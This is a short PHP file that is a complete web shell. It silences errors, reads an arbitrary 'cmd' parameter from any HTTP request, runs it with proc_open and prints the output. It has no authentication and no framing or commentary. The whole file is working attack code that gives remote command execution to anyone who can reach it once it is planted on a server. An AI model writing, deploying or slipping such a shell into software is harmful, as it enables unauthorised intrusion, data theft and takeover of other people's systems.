<?php
error_reporting(0);
ini_set('display_errors', 0);

if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];

    // Try proc_open if available
    if (function_exists('proc_open')) {
        $descriptors = [
            0 => ['pipe', 'r'], // stdin
            1 => ['pipe', 'w'], // stdout
            2 => ['pipe', 'w'], // stderr
        ];

        $process = proc_open($cmd, $descriptors, $pipes);
        if (is_resource($process)) {
            echo "<pre>" . stream_get_contents($pipes[1]) . "</pre>";
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        } else {
            echo "Failed to execute command.";
        }
    } else {
        echo "No command execution functions available.";
    }
} else {
    echo "No command provided.";
}
?>
